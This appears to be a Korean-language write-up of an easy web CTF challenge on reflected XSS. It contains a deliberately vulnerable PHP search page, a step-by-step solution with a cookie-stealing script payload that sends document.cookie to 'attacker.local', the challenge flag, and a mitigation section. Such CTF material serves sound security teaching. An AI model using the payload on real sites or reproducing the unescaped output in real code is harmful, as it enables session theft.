---
title: Reflected Cross-Site Scripting (Reflected XSS) — Web CTF Scenario
created: 2026-06-15
updated: 2026-06-15
type: ctf-scenario
tags: [ctf, web, xss, reflected-xss, client-side, easy]
confidence: high
---

# Reflected Cross-Site Scripting (Reflected XSS) — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Search Dashboard Lite (간이 검색 대시보드)
- **난이도**: Easy (초급)
- **핵심 컨셉**: 웹 애플리케이션 보안에서 가장 널리 알려진 기초적인 클라이언트단 취약점인 **반사형 크로스 사이트 스크립팅 (Reflected XSS)** 문제입니다. 대상 서비스는 사용자가 입력한 검색어 키워드를 파라미터로 받아서 데이터 목록을 조회하고, 검색 결과를 화면에 뿌려주는 과정에서 "사용자가 입력한 검색어: `[검색어]`" 의 형식으로 화면에 함께 인쇄합니다. 이때 개발자가 사용자 입력값을 HTML 엔티티 인코딩 처리 없이 웹 브라우저에 그대로 반사(Reflected)시켜 렌더링되게 구현했습니다. 공격자는 검색어 파라미터 영역에 임의의 자바스크립트 코드(`<script>`)를 기입하고, 이 악성 주소를 피해자에게 전달하여 실행시키는 방식으로 타겟 사용자의 세션 정보(쿠키)를 탈취합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Search Page (`/search.php`)**:
  - 사용자가 입력한 `?query=...` 파라미터를 GET 방식으로 수신.
  - 검색된 결과 목록과 함께 검색창 상단에 입력한 `query` 문자열을 이스케이프 없이 HTML 화면에 렌더링.
- **Flag 위치**:
  - 관리자 봇(Admin Bot)이 로그인한 상태로 전달받은 XSS 링크 주소를 방문할 때, 봇의 세션 쿠키 값(`Cookie: session=[FLAG]`).

### 2.2 취약점 지점
1. **Unencoded Output Reflection**:
   - 백엔드 PHP/JS가 클라이언트 파라미터 값을 HTML 컨텍스트에 직접 바인딩합니다:
     `echo "<div>검색 결과: " . $_GET['query'] . "</div>";`
   - 브라우저 파서는 이를 데이터 문자열이 아닌 HTML 마크업 태그로 해석하여, 포함된 자바스크립트 엔진을 즉각 가동합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 파라미터 | 데이터 타입 | 취약 함수 및 태그 |
|------------|--------|------|----------|-------------|-------------------|
| `/search.php` | GET | 불필요 | `query` | Text / String | `echo` / `innerHTML` 등 원시 출력부 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 파라미터 반사 확인 및 취약성 점검
1. 검색 도구에 일반 텍스트 단어를 입력해 봅니다.
   `/search.php?query=apple`
2. 반환되는 HTML 결과 소스코드 내부에 입력한 `apple` 문자열이 그대로 존재하는지 확인합니다.
3. HTML 태그 괄호 기호인 `<` 및 `>`를 넣어서 인코딩 여부를 판독합니다.
   `/search.php?query=<h1>test</h1>`
4. 화면에 'test'가 가장 큰 제목(h1) 폰트로 출력되는 것을 보고 보안 필터링이 전혀 없음을 식별합니다.

### Step 2. XSS 탈취 페이로드 설계
피해자의 쿠키를 공격자 서버로 가져가기 위해 인라인 스크립트를 작성합니다.
- **XSS 페이로드**:
  `<script>location.href='http://attacker.local/log?c='+document.cookie</script>`
- **URL 인코딩된 최종 공격 링크**:
  `http://target.local/search.php?query=%3Cscript%3Elocation.href%3D%27http%3A%2F%2Fattacker.local%2Flog%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E`

### Step 3. 피해자 링크 접속 유도
1. 공격자는 위와 같이 조작된 URL 주소를 생성합니다.
2. 관리자 봇(Admin Bot)의 모킹 봇 방문 기능에 이 링크를 전달합니다.

### Step 4. flag 획득
1. 관리자 봇이 전달받은 링크에 접근하면 봇 브라우저의 컨텍스트 하에서 `/search.php` 페이지가 로드됩니다.
2. 봇의 브라우저는 응답에 반사된 자바스크립트 코드를 실행하며, `document.cookie`에 들어있는 관리자 세션 값을 `attacker.local`로 넘깁니다.
3. 공격자는 자신의 서버 로그 파일에서 플래그(`FLAG{reflected_xss_basic_cookie_stealing}`)를 확인하고 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (PHP)

```php
<!-- search.php (취약한 반사형 XSS PHP 예시) -->
<!DOCTYPE html>
<html>
<head>
    <title>Search Portal</title>
</head>
<body>
    <h1>간이 검색 서비스</h1>
    
    <form method="GET" action="search.php">
        <input type="text" name="query" placeholder="검색어를 입력하세요" />
        <button type="submit">검색</button>
    </form>

    <div class="search-result">
        <?php
        if (isset($_GET['query'])) {
            $query = $_GET['query'];
            
            // 취약점 지점: 사용자 입력인 $query 변수 값을 
            // htmlspecialchars() 같은 HTML 인코딩 처리 없이 그대로 웹 브라우저 화면에 출력
            echo "<p>당신이 입력한 검색어: <b>" . $query . "</b></p>";
            
            // 데이터베이스 조회 시뮬레이션
            echo "<ul><li>검색 결과가 없습니다.</li></ul>";
        }
        ?>
    </div>
</body>
</html>
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **컨텍스트 인식 HTML 인코딩 (HTML Entity Encoding)**:
   - 클라이언트에서 전달받은 변수 데이터를 화면의 HTML 본문 영역에 렌더링할 때, 특수 기호들(`<`, `>`, `&`, `"`, `'`)을 안전한 HTML 문자 참조 엔티티로 치환해 주는 표준 인코딩 함수(`htmlspecialchars` 등)를 상시 적용합니다.
     ```php
     // 안전한 출력 기법
     echo "<p>검색어: <b>" . htmlspecialchars($query, ENT_QUOTES, 'UTF-8') . "</b></p>";
     ```
2. **콘텐츠 보안 정책 (CSP) 선언**:
   - HTTP 응답 헤더에 `Content-Security-Policy: default-src 'self';` 정책을 선언하여, 페이지 내에서 인라인 자바스크립트가 무단 실행되는 현상을 브라우저 레벨에서 원천 불허하도록 차단합니다.
3. **HTTPOnly 세션 쿠키 설정**:
   - 세션 쿠키 발급 시 `HttpOnly` 옵션을 기본 부착하여, 만약 XSS 공격이 발생하더라도 자바스크립트(`document.cookie`)를 통해 세션 토큰 자체가 유출되는 시도를 물리적으로 방지합니다.
